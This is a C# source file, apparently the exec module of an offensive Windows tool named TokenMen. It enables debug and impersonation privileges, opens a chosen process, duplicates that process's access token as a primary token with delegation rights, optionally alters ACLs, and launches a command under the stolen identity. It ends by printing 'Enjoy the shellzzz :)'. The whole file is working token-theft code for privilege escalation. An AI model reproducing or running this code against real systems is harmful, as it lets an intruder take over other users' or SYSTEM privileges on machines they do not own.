
using Args;
using System.Diagnostics;
using TokenMen.ModulesOptions;

namespace TokenMen.Modules;

internal class ExecModule
{
    public static void Run(ArgParser parser)
    {
        var args = parser.Parse<ExecOptions>();

        /// If Interactive, get session ID from user and try uint it otherwise get session ID from our process
        if (args.Interactive)
        {
            if (!parser.IsSet(nameof(args.SessionId)))
            {
                ProcessIdToSessionId((uint)Process.GetCurrentProcess().Id, out uint sessId);
                args.SessionId = sessId;
            }
        }
        Console.WriteLine("[!] Using token from PID: {0} to launch: {1} {2}",
                       args.Pid,
                       args.Command,
                       args.Interactive ? $"with Session ID: {args.SessionId}" : "");

        string[] privileges = { SE_DEBUG_NAME, SE_IMPERSONATE_NAME };
        if (!Utils.PrivilegeEnabler(privileges))
            return;

        /// Get Handle to the Process chosen by the user
        IntPtr hProc = OpenProcess(PROCESS_ACCESS.PROCESS_QUERY_LIMITED_INFORMATION, false, args.Pid);
        if (hProc == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess Failed. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Got handle to process");

        /// Get Handle to target Process's Token
        var tokenAccessRights = TokenAccessRights.TOKEN_DUPLICATE | TokenAccessRights.TOKEN_QUERY | TokenAccessRights.TOKEN_ASSIGN_PRIMARY;
        bool res = OpenProcessToken(hProc, tokenAccessRights, out IntPtr hToken);
        if (!res || hToken == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to get token handle. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Got handle to token");

        /// Duplicate to primary token
        tokenAccessRights = TokenAccessRights.TOKEN_ALL_ACCESS;
        bool dup = DuplicateTokenEx(hToken, tokenAccessRights, IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary, out IntPtr hDupToken);
        if (!dup || hDupToken == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to duplicate token. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Token duplicated Successfully");


        if (!parser.IsSet(nameof(args.ChangeACL)))
        {
            goto Launcher;
        }

        object objTrustee = args.ChangeACL switch
        {
            AclActions.Everyone => default,
            AclActions.Dynamic => hDupToken,
            AclActions.Sid => args.Trustee,
            AclActions.User => args.Trustee,
            _ => hDupToken, /// Use target user by default (less intrusive)
        };

        if (!Acl.Change(args.ChangeACL, objTrustee))
        {
            Console.WriteLine("[-] Failed to change ACLs");
            return;
        }
        Console.WriteLine("[+] ACLs changed");

    // TODO: revoke ACL

    Launcher:
        Launcher launcher = new(hDupToken, args.Command, args.Interactive,
            parser.IsSet(nameof(args.SessionId)) ? args.SessionId : null);

        if (launcher.Launch())
            Console.WriteLine("[+] Enjoy the shellzzz :) ");
    }
}
